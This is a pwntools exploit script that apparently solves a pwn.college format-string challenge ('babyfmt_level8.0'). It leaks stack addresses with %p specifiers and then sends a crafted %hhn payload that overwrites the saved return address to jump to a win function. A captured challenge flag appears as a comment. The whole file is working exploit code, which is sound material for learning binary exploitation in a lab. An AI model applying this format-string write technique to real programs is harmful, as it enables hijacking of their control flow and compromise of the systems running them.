from pwn import *
#context.binary = "/challenge/babyfmt_level8.0"
context.terminal = ['tmux','splitw','-h']
p = process("/challenge/babyfmt_level8.0")
#p = gdb.debug("/challenge/babyfmt_level8.0")
p.recv()
# for i in range(0,200):
#     log.info("position: %d", i)
#     payload = str('%{}$p'.format(i)).encode()
#     p.sendline(payload)
#     msg = p.recv().decode()
#     print(msg)
#     if '414141' in msg: break
#     else:
#         p.recv()
#         pass
payload = str('%203$p.%199$p').encode()
p.sendline(payload)
#print(p.recv())
p.recvuntil(b'Your input is:')
p.recvline()
leak = p.recvline().strip(b'\n').decode().split('.')
print(leak)
leak[1] = leak[1][:-3] + '553'
#leak[0] = leak[0][:-3] + '7c8'
leak_rip = int(leak[1],base=16)
leak_rbp = int(leak[0],base=16) - 0x150

print(leak[1][-4:-2])
temp = int(leak[1][-4:-2],base=16)-67-5-11
payload2 = b'A'*5 + str('%11c%82$hhn%{}c%83$hhn'.format(temp).ljust(40,'.')).encode() + p64(leak_rbp) + p64(leak_rbp+1)
#log.info("Payload: %s", payload2)
log.info('Address contain ret address: %s', hex(leak_rbp))
log.info("Win func: %s", hex(leak_rip))

p.sendline(payload2)
time.sleep(1)
p.sendline(b'END')
p.interactive()
#input position: 76
#leak rbp: 198
#3553
#pwn.college{cFzBwanZg2kiB0KAq20DUps3kzf.dBzM0MDLwETOyEzW}
